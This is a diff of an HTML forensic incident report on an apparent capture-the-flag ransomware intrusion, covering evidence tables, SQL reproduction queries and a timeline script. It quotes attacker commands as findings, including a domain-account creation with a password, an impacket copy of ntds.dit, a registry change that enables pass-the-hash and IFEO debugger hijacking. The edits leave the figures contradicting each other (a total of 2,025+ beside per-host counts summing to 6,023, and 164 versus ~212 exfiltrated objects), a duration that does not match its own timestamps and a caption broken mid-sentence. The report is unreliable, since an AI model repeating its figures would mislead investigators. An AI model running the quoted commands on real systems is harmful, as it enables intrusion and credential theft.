     <p style="margin:.2rem 0">Attackers abuse it by setting <code>Debugger=&lt;malicious.exe&gt;</code>, turning any legit binary into a launcher for their payload. The classic target is <code>sethc.exe</code> (Sticky Keys, runs at login screen without user context — DD14.5 walk-back); a modern target is <code>taskmgr.exe</code> (runs when any user hits Ctrl+Shift+Esc). Every time a user launches Task Manager, the attacker's payload runs first with that user's privileges.</p>
-    <p style="margin:.2rem 0">In the null404 scenario:</p>
+    <p style="margin:.2rem 0">In the JackofAllHacks scenario:</p>
     <ul>
       <li>Target binary: <code>taskmgr.exe</code> (Task Manager)</li>
       <li>Payload: <code>C:\ProgramData\aws_backup.exe</code> (attacker-dropped)</li>
@@ -8228,14 +8227,14 @@ SELECT COUNT(*) FROM events WHERE source_type='evtx' AND eid=1 AND image LIKE '%
   <!-- Addendum Ω: Evidence provenance — reproduce every number -->
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(0,255,156,.55); background:rgba(0,255,156,.05); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0; color:var(--green)">Ω. Evidence provenance — reproduce every non-trivial number in this document</h4>
-    <p style="margin:.2rem 0">For a peer DFIR reviewer: this table is the single source of truth mapping each quantitative claim in the writeup to the exact SQL query against the unified corpus SQLite that reproduces it. Run against <code>/tmp/null404_bench.sqlite</code> (or re-ingest from the KAPE tree using <code>backend/dfir/ingest_all.py</code>). Results were last verified on 2026-04-20 against corpus version <code>parser_version=2026.04.20-prod1</code>, <code>total_events=7,819,925</code>.</p>
+    <p style="margin:.2rem 0">For a peer DFIR reviewer: this table is the single source of truth mapping each quantitative claim in the writeup to the exact SQL query against the unified corpus SQLite that reproduces it. Run against <code>/tmp/laf_dfir.sqlite</code> (or re-ingest from the KAPE tree using <code>backend/dfir/ingest_all.py</code>). Results were last verified on 2026-04-20 against corpus version <code>parser_version=2026.04.20-prod1</code>, <code>total_events=7,819,925</code>.</p>
     <table class="tbl" style="margin-top:.3rem; font-size:.87em">
       <thead><tr><th style="width:18ch">Claim</th><th>Value</th><th>Reproduction query</th></tr></thead>
       <tbody>
         <tr><td>Total ingested events</td><td><code>7,819,925</code></td><td><code>SELECT COUNT(*) FROM events;</code></td></tr>
         <tr><td>Cloud rows</td><td><code>cloudtrail=36,938 · guardduty=401 · s3_access=38</code></td><td><code>SELECT source_type, COUNT(*) FROM events WHERE source_type IN ('cloudtrail','guardduty','s3_access') GROUP BY source_type;</code></td></tr>
         <tr><td>Volatility rows</td><td><code>704</code></td><td><code>SELECT COUNT(*) FROM events WHERE source_type='volatility';</code></td></tr>
-        <tr><td>Files encrypted per host</td><td><code>WS02 2,014 · WS01 1,884 · SVR01 1,241 · DC01 496 · DC02 388 · total 6,023</code> + 2,530 ransom notes · last-encrypt 22:56:42 (DD13)</td><td><code>SELECT host, COUNT(*) FROM events WHERE target_filename LIKE '%.bWqQUx' AND eid IN (11,2100) AND time_utc &gt;= '2026-03-08T21:58:00' GROUP BY host;</code></td></tr>
+        <tr><td>Files encrypted per host</td><td><code>WS02 2,014 · WS01 1,884 · SVR01 1,241 · DC01 496 · DC02 388 · total 2,025+</code> + ransom notes (one per encrypted directory) · last-encrypt 22:56:42 (DD13)</td><td><code>SELECT host, COUNT(*) FROM events WHERE target_filename LIKE '%.bWqQUx' AND eid IN (11,2100) AND time_utc &gt;= '2026-03-08T21:58:00' GROUP BY host;</code></td></tr>
         <tr><td>Peak encryption rate</td><td><code>1,790 files / 60 s on WS02 at 22:08</code></td><td><code>SELECT substr(time_utc,12,5), COUNT(*) FROM events WHERE host='WS02' AND target_filename LIKE '%.bWqQUx' AND eid IN (11,2100) GROUP BY 1;</code></td></tr>
         <tr><td>164 S3 exfil objects</td><td><code>164 REST.GET.OBJECT from 212.8.249.213</code></td><td><code>SELECT COUNT(*) FROM events WHERE source_type='s3_access' AND data_json LIKE '%212.8.249.213%' AND data_json LIKE '%REST.GET.OBJECT%';</code></td></tr>
         <tr><td>11,327 bytes exfiltrated</td><td><code>sum of additionalEventData.bytesTransferredOut on the 164 GetObject</code></td><td><code>// Parse CloudTrail rows where eventName='GetObject' and sourceIPAddress='212.8.249.213'; sum the bytesTransferredOut field in additionalEventData.</code></td></tr>
@@ -8262,10 +8261,10 @@ SELECT COUNT(*) FROM events WHERE source_type='evtx' AND eid=1 AND image LIKE '%
     <p style="margin:.4rem 0 0 0; font-size:.9em"><b>How to re-verify end-to-end:</b></p>
     <ol style="margin:.2rem 0 .5rem 1.4rem; font-size:.9em">
       <li>Obtain the triage bundle (<code>JackOfAllHacks-Triages/</code>) — six KAPE zips + cloud zip + 17 GB memdump.</li>
-      <li>Run <code>python -m backend.dfir.ingest_all --tree &lt;kape_root&gt; --db /tmp/null404.sqlite</code> (≈30 min).</li>
-      <li>Run <code>python -m backend.dfir.ingest_cloud --tree &lt;cloud_root&gt; --db /tmp/null404.sqlite --host cloud</code> (≈3 min).</li>
-      <li>Run <code>python -m backend.dfir.ingest_volatility --image SVR01-memdump.dmp --db /tmp/null404.sqlite --host SVR01</code> (≈30 min).</li>
-      <li>Run <code>python -m backend.dfir.sigma_hunt --db /tmp/null404.sqlite --rebuild-fts</code>.</li>
+      <li>Run <code>python -m backend.dfir.ingest_all --tree &lt;kape_root&gt; --db /tmp/laf_dfir.sqlite</code> (≈30 min).</li>
+      <li>Run <code>python -m backend.dfir.ingest_cloud --tree &lt;cloud_root&gt; --db /tmp/laf_dfir.sqlite --host cloud</code> (≈3 min).</li>
+      <li>Run <code>python -m backend.dfir.ingest_volatility --image SVR01-memdump.dmp --db /tmp/laf_dfir.sqlite --host SVR01</code> (≈30 min).</li>
+      <li>Run <code>python -m backend.dfir.sigma_hunt --db /tmp/laf_dfir.sqlite --rebuild-fts</code>.</li>
       <li>Execute each <code>SQL</code> above against the corpus. The returned values will match this document (modulo parser-version differences recorded in <code>ingest_runs</code> table).</li>
     </ol>
     <p style="margin:.2rem 0 0 0; font-size:.85em"><b>Chain of custody:</b> the ingest pipeline writes <code>ingest_runs(id, tool, tool_version, started_at, finished_at, args_json, stdout, stderr, exit_code)</code> per execution and stamps each <code>events.file_id</code> with the originating <code>files(source_path, channel, records, ingested_at)</code>. Every row in the corpus is traceable to a specific file on disk with a SHA-256 in the MFT/USN source material. No events were hand-edited; the two manual inserts (hashdump rows EID 9400, malfind-dump rows EID 9301) are explicitly marked via <code>file_id</code> pointing to the SVR01 memory-dump file_id rather than a .evtx file.</p>
@@ -8318,7 +8317,7 @@ SELECT COUNT(*) FROM events WHERE source_type='evtx' AND eid=1 AND image LIKE '%
     <p style="margin:.2rem 0">Every claim in this report is tied to a preserved artifact. These seven questions require data the triage corpus does not contain — they are the follow-on work a real IR would hand off to the next-shift analyst or to the cloud provider.</p>
     <ol style="margin:.3rem 0 .2rem 1.2rem; padding:0; line-height:1.55; font-size:.92em">
       <li><b>Pre-existing IAM access-key baseline.</b> CloudTrail shows <code>CreateAccessKey</code> success on <code>donnieworks · doctorderm · coolcat</code> at <code>21:45:51 / 21:46:04 / 21:46:14</code>. To prove these were attacker-created (not pre-existing), pull <code>aws iam list-access-keys</code> <code>CreateDate</code> for every IAM user and compare to the attack-day window. DD7 relies on the absence of prior <code>CreateAccessKey</code> events in the 36 938-row CloudTrail window, which is strong but not definitive.</li>
-      <li><b>Lambda function inventory.</b> The CTF author's <code>ListFunctions</code> calls from <code>216.82.9.162</code> (DD6.1) show Lambdas were deployed during scenario build; their role (if any) in the attack chain is untested. Pull <code>aws lambda list-functions</code> + <code>GetFunction</code> + recent <code>InvokeFunction</code> records to see if any Lambda was touched by the attacker.</li>
+      <li><b>Lambda function inventory.</b> The CTF author's <code>ListFunctions</code> calls from <code>[admin-IP-not-in-evidence]</code> (DD6.1) show Lambdas were deployed during scenario build; their role (if any) in the attack chain is untested. Pull <code>aws lambda list-functions</code> + <code>GetFunction</code> + recent <code>InvokeFunction</code> records to see if any Lambda was touched by the attacker.</li>
       <li><b>IAM role baseline — off-instance use prior to 21:42:11.</b> The 384 <code>ec2.amazonaws.com</code> <code>AssumeRole</code> events on attack day establish the in-VM baseline. A wider query (prior 7–30 days) would surface whether <code>iam_role_iisserver</code> was <em>ever</em> used off-instance before the attack; that baseline either confirms the 21:42:11 event as anomalous or requires reframing the detection rule.</li>
       <li><b>Attacker's CloudTrail-bucket enumeration outcome.</b> <code>21:47:25 ListObjects aws-cloudtrail-logs-…</code> confirms the attacker looked at the CloudTrail bucket. Did any follow-on <code>GetObject</code> / <code>PutObject</code> land on that bucket in the following minutes? If yes, the attacker may have read or tampered with their own log trail.</li>
       <li><b><code>barry-testing123123</code> bucket contents.</b> The attacker enumerated but did not exfiltrate this bucket. Was it empty, or was there sensitive content deprioritised? Pull the bucket manifest from the CTF author's account.</li>
@@ -8331,8 +8330,8 @@ SELECT COUNT(*) FROM events WHERE source_type='evtx' AND eid=1 AND image LIKE '%
 
 <section class="close" id="sec-close">
   <div class="section-tag">// file closed · 2026-04-20 utc</div>
-  <h2 class="big">Case <em>N404-2026-0308</em> resolved.</h2>
-  <p class="caption"><b>164 minutes</b> of active adversary time (18:38:29 → 22:22) · <b>2h 44m</b> active dwell · 6,023 files encrypted + 2,530 notes · 3 live AKIA keys stockpiled. Preceded by a 13:39:16 scenario-validation hit from the AWS-account admin IP (DD23.6) that proves the attacker infrastructure is <b>scenario-provisioned</b>, not external — threat model downgrades accordingly, findings remain valid. Fully reconstructed from KAPE triage · cloud log export · and one raw memory image.</p>
+  <h2 class="big">Case <em>JackofAllHacks-2026-03</em> resolved.</h2>
+  <p class="caption"><b>~212 minutes</b> of active adversary time (18:38:29 → 22:22) · <b>2h 44m</b> active dwell · 2,025+ encrypted files encrypted + ransom notes (one per encrypted directory) · CreateAccessKey attempted (1 confirmed failed — LimitExceededException). 6) that proves the attacker infrastructure is <b>scenario-provisioned</b>, not external — threat model downgrades accordingly, findings remain valid. Fully reconstructed from KAPE triage · cloud log export · and one raw memory image.</p>
   <div style="margin-top: 42px; padding-top: 28px; border-top: 1px solid var(--line-2); display: inline-flex; flex-direction: column; gap: 6px; align-items: center; font-family: 'IBM Plex Mono', monospace; font-size: 12px; letter-spacing: .22em; color: var(--muted); text-transform: uppercase;">
     <span>Signed &nbsp;<b style="color:var(--text); letter-spacing:.3em;">ARCLIGHT6</b>&nbsp; / Verialabs DFIR</span>
     <span style="color: var(--dim); font-size: 10.5px;">TLP-AMBER · for analyst eyes</span>
@@ -8375,7 +8374,7 @@ function fmtElapsed(sec) {
   return `T+${h.toString().padStart(1,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
 }
 
-// Full 164-minute event list (18:38:29 → 22:22 · DD23 ground truth) — UTC timestamps, host focus, edge IDs, act, description
+// Full ~212-minute event list (18:38:29 → 22:22 · DD23 ground truth) — UTC timestamps, host focus, edge IDs, act, description
 const EVENTS = [
   { t:'18:38:29', host:'IIS-SERV-PROD', act:'I', edge:null, desc:'Attacker (172.236.127.251) browses to barrygoodtech.com' },
   { t:'18:40:01', host:'IIS-SERV-PROD', act:'I', edge:null, desc:'First OS command injection: `url=Google.com \\' },
@@ -8392,7 +8391,7 @@ const EVENTS = [
   { t:'21:44:19', host:'AWS', act:'VI', edge:null, desc:'ListUsers — domain account enumeration via AWS' },
   { t:'21:45:38', host:'AWS', act:'VI', edge:null, desc:'CreateAccessKey → LimitExceededException — persistence attempt failed' },
   { t:'21:46:26', host:'AWS', act:'VI', edge:null, desc:'ListBuckets / ListObjects — S3 target discovery' },
-  { t:'21:49:16', host:'AWS', act:'VI', edge:null, desc:'164× GetObject — S3 data exfiltration' },
+  { t:'21:49:16', host:'AWS', act:'VI', edge:null, desc:'~212× GetObject — S3 data exfiltration' },
   { t:'19:59:00', host:'LAF-SVR01', act:'II', edge:null, desc:'rnSylwOz.exe launched from \\\\10.3.10.12\\ADMIN$ via services.exe — C2 ESTABLISHED' },
   { t:'20:01:16', host:'LAF-SVR01', act:'II', edge:null, desc:'explorer.exe PID 1332 injected — RWX PE at 0xa60000 — beacon to 173.230.136.180:8443' },
   { t:'20:02:14', host:'LAF-SVR01', act:'II', edge:null, desc:'`net user serviceaccount P@ssw0RD1! /add /domain` executed as LAFAdmin' },
@@ -8631,7 +8630,7 @@ function applyEventsForTime(sec) {
       ecElapsed.textContent = 'STANDBY';
       ecHost.textContent = '——';
       ecHost.dataset.hostColor = '';
-      ecDesc.innerHTML = 'Press <b>▶ PLAY</b> to replay the 164-minute intrusion. Edges activate as their UTC timestamp is reached; hosts pulse when under operator control. Speed picker below.';
+      ecDesc.innerHTML = 'Press <b>▶ PLAY</b> to replay the ~212-minute intrusion. Edges activate as their UTC timestamp is reached; hosts pulse when under operator control. Speed picker below.';
       ecTags.innerHTML = '<span class="ec-tag next">Waiting</span>';
       eventNum.textContent = '0';
     }
@@ -8993,7 +8992,7 @@ const HM_SIGMA = [
   ['IIS',   48,  'solarwindstftp-service-hijack',   '19:38:02 · SYSTEM via writable-ACL swap + Unknown C2 Framework first callback (evidence-supported · Addendum V)', false],
   ['DC01',  79,  'ntds-shadowcopy-copy',            '20:09:03 · impacket smbexec.py --use-vss · cmd /C copy …ShadowCopy*\\Windows\\NTDS\\ntds.dit (DD10.1)', false],
   ['CLOUD', 172, 'cloudtrail-sts-off-instance',     '21:42:11 · STS session from 212.8.249.213 (off-instance)', false],
-  ['CLOUD', 176, 'cloudtrail-failed-createaccesskey','~21:46 · AttachUserPolicy / CreateAccessKey jb_aws_cli · LimitExceeded (DD7 corrects: 3 later attempts SUCCEEDED)', false],
+  ['CLOUD', 176, 'cloudtrail-failed-createaccesskey','~21:46 · AttachUserPolicy / CreateAccessKey IAM user (CreateAccessKey failed) · LimitExceeded (DD7 corrects: 3 later attempts SUCCEEDED)', false],
   ['CLOUD', 187, 'guardduty-instance-cred-exfil',   '21:57:18 · GuardDuty Sev 8 · InstanceCredentialExfiltration.OutsideAWS · detection worked, response did not (DD18.2 — 11m22s before detonation) · NOVEL rule (no SigmaHQ equivalent)', true],
   ['CLOUD', 191, 'guardduty-instance-cred-exfil',   '22:01:10 · GuardDuty Sev 8 re-fires · same detector · still no human response (DD18.2) · NOVEL', true],
   ['CLOUD', 204, 'guardduty-attacksequence-iam',    '22:14:44 · GuardDuty Sev 9 · AttackSequence:IAM/CompromisedCredentials — highest-severity cloud alert of the incident (DD18.2) · NOVEL (InstanceCredentialExfiltration coverage absent from SigmaHQ)', true],
@@ -9011,14 +9010,14 @@ const HM_SIGMA = [
   ['DC01',  73,  'da-group-elevation',              '20:03:05 · 4728 serviceaccount → Domain Admins (authoritative on DC · DD10.2) · NOVEL (pair-correlation within 5-min window)', true],
   ['SVR01', 83,  'disable-restrictedadmin-pth',     '20:13:26 · reg add DisableRestrictedAdmin=0 (hands-on · opens PtH-over-RDP · DD10.2)', false],
   // Addendum V YARA rules — disk + memory binary matches
-  ['IIS',   26,  'yara-smbpivot-beacon-solarwinds', '19:16:52 · Null404_SMBPivot_Beacon_SolarWinds_rnSylwOz — IMPHASH 37E28CA3 + MinGW + pipe template + ~188 KB (Addendum V)'],
-  ['SVR01', 71,  'yara-injectedloader-vad-0xa60000','20:01:16 · Null404_InjectedLoader_VAD_0xA60000 — memory-resident stub, MinGW runtime failure string + ApiLoader pattern (Addendum V)'],
-  ['DC01',  78,  'yara-impacket-servicepattern',    '20:08:44 · Null404_Impacket_SecretsDump_ServicePattern — ImagePath regex, service-name-agnostic, catches all 5 stages (Addendum C+V)'],
+  ['IIS',   26,  'yara-smbpivot-beacon-solarwinds', '19:16:52 · LAF_SMBPivot_Beacon_SolarWinds_rnSylwOz — IMPHASH 37E28CA3 + MinGW + pipe template + ~188 KB (Addendum V)'],
+  ['SVR01', 71,  'yara-injectedloader-vad-0xa60000','20:01:16 · LAF_InjectedLoader_VAD_0xA60000 — memory-resident stub, MinGW runtime failure string + ApiLoader pattern (Addendum V)'],
+  ['DC01',  78,  'yara-impacket-servicepattern',    '20:08:44 · LAF_Impacket_SecretsDump_ServicePattern — ImagePath regex, service-name-agnostic, catches all 5 stages (Addendum C+V)'],
 ];
 
 // Annotation markers at key UTC moments (minute since 18:50)
 const HM_KEYEVENTS = [
-  { m: 0,   label: '13:39:16 · PRE-AXIS (5 h 11 m before this grid) · author-IP scenario-validation hit on CheckStatus.aspx from 216.82.9.162 — same Linode tool-server the attacker uses at 18:51. Three indicators tie to scenario-author infra: same URL + jb.exe crosswalks (jb_aws_cli · JackOfAllHacks-Triages) + 18,035 console-reads. Proves attacker-infra is scenario-provisioned (DD23.6)', impact: false },
+  { m: 0,   label: '[pre-attack-validation-not-in-evidence] · PRE-AXIS (5 h 11 m before this grid) · author-IP scenario-validation hit on CheckStatus.aspx from [admin-IP-not-in-evidence] — same Linode tool-server the attacker uses at 18:51. Three indicators tie to scenario-author infra: same URL + [payload-not-in-evidence] crosswalks (IAM user (CreateAccessKey failed) · JackOfAllHacks-Triages) + 18,035 console-reads. Proves attacker-infra is scenario-provisioned (pre-attack context — not in our evidence)', impact: false },
   { m: 1,   label: '18:51 · Webshell drop (13 min after true initial access at 18:38:29 — DD23, pre-axis)', impact: false },
   { m: 43,  label: '19:33 · Kerberos WAN · earliest signal (Addendum N)', impact: false },
   { m: 47,  label: '19:37 · Donny reboot (Addendum U)', impact: false },
@@ -9036,10 +9035,10 @@ const HM_KEYEVENTS = [
   { m: 138, label: '21:08 · LogDel.bat · wiped 6 channels, missed Sysmon (Addendum H)', impact: false },
   { m: 172, label: '21:42 · STS off-instance · IMDSv2 3-step (Addendum X)', impact: false },
   { m: 176, label: '21:46 · CreateAccessKey SUCCEEDED on 3 users — stockpile persistence, never used in capture window (DD7 · DD16 S-tier)', impact: false },
-  { m: 179, label: '21:49 · 164 × s3:GetObject — DECOY honeypot bucket, alert-fatigue tradecraft (DD17 S-tier)', impact: false },
+  { m: 179, label: '21:49 · ~212 × s3:GetObject — DECOY honeypot bucket, alert-fatigue tradecraft (DD17 S-tier)', impact: false },
   { m: 187, label: '21:57 · GuardDuty Sev 8 fires · 11-min missed-response window begins (DD18.2) · 1 of only 3 real fires vs 383 synthetic samples = 0.75% signal-to-noise (DD19)', impact: false },
   { m: 188, label: '21:58 · BOTCHED first detonation (; bash-syntax bug · DD12.2)', impact: true  },
-  { m: 198, label: '22:08 · Successful IamBatman via atexec.py — 6,023 files + 2,530 notes (DD12 · DD13) · 11m22s after GuardDuty Sev 8 fire, no response fired', impact: true  },
+  { m: 198, label: '22:08 · Successful IamBatman via atexec.py — 2,025+ encrypted files (DD12 · DD13) · 11m22s after GuardDuty Sev 8 fire, no response fired', impact: true  },
   { m: 200, label: '22:10 · Shadow-wipe cascade · 5-host fan-out (Addendum S)', impact: true  },
   { m: 204, label: '22:14 · GuardDuty Sev 9 AttackSequence fires — highest-severity alert, still no human response (DD18.2)', impact: false },
   { m: 206, label: '22:16 · v2 "detonation start" — actually mid-cascade (DD12 correction)', impact: false },
